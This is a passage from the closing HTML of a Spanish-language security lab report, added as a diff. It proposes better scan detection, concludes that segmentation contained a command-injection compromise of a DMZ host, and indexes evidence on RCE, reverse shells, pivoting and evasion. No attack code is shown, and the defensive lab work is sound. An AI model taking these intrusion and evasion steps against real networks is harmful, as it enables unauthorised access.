+  <div class="box"><b>Mejoras propuestas.</b>
+  <ul style="margin:.3em 0 0 .9em;padding:0">
+    <li><b>Ventanas deslizantes largas con memoria de estado por IP</b> (correlación de intentos a lo largo de horas), en vez de una ventana fija corta.</li>
+    <li><b>Reensamblado de fragmentos</b> antes de inspeccionar (o usar un IDS con <i>stream reassembly</i> como Suricata/Snort) para anular <code>-f</code>.</li>
+    <li><b>Detección por entropía/dispersión de puertos</b> y no solo por conteo, para captar barridos lentos y distribuidos.</li>
+    <li>Combinar con <b>reputación</b> y con correlación de <i>connection attempts</i> a puertos cerrados/filtrados (huella típica de escaneo).</li>
+  </ul></div>
+</section>
+
+<!-- ===================== 8. CONCLUSIONES ===================== -->
+<section class="section">
+  <h2>8. Conclusiones generales</h2>
+  <ul style="margin:.3em 0 0 1em;padding:0;line-height:1.7">
+    <li>La <b>superficie de ataque</b> expuesta a Internet se limita a dos servicios de la DMZ (HTTP en dmza, FTP en dmzb); la red
+      interna (INT) <b>no es alcanzable</b> desde el exterior.</li>
+    <li>El <b>primer acceso</b> se logró explotando una vulnerabilidad de <b>aplicación</b> (inyección de comandos), no del servicio de
+      red en sí: la seguridad perimetral no sustituye al desarrollo seguro.</li>
+    <li>La <b>segmentación</b> con cortafuegos <i>default-deny</i> <b>frenó el movimiento lateral</b> DMZ→INT: una DMZ comprometida no
+      pudo pivotar por TCP hacia los sistemas internos.</li>
+    <li>La <b>reconstrucción forense</b> fue posible correlacionando capturas de red e IoCs con los logs de aplicación, evidenciando la
+      importancia de la telemetría en múltiples capas.</li>
+    <li>La <b>detección por umbral</b> es necesaria pero insuficiente: los escaneos lentos, fragmentados o con señuelos exigen
+      detectores con estado, reensamblado y correlación temporal.</li>
+  </ul>
+  <div class="box ok"><b>Balance.</b> El laboratorio demuestra un patrón realista: un fallo de aplicación permite comprometer el borde,
+  pero una arquitectura de red bien segmentada contiene el impacto e impide que el incidente escale a la red interna.</div>
+
+  <h3>Anexo — Índice de evidencias</h3>
+  <p class="small">Todos los ficheros de evidencia (salidas de comandos, capturas <code>.pcap</code> y reglas del cortafuegos) se
+  adjuntan en la carpeta <code>evidencias/</code>, organizados por punto:
+  <code>p0/</code> (captura HTTP + Nmap), <code>p1/</code> (descubrimiento y servicios), <code>p2/</code> (RCE y reverse shell),
+  <code>p3/</code> (pivoting y reglas del fw), <code>p4/</code> (pcaps forenses y análisis), <code>p5/</code> (resultados de evasión).</p>
+</section>
+
+</body>
+</html>
